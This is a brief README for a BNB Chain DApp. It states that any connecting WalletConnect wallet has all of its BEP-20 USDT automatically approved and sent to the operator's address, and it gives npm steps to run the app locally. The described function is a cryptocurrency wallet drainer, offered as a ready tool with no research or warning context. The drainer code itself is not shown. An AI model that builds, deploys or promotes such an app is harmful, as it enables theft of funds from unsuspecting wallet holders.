# One-Click USDT BSC DApp

- Connects any WalletConnect v2 wallet
- Auto-approves and auto-sends all BEP-20 USDT on BNB Chain to your SAFE address
- All logic in `/pages/index.js`

## Deploy Steps

1. `npm install`
2. `npm run dev`
3. Open http://localhost:3000
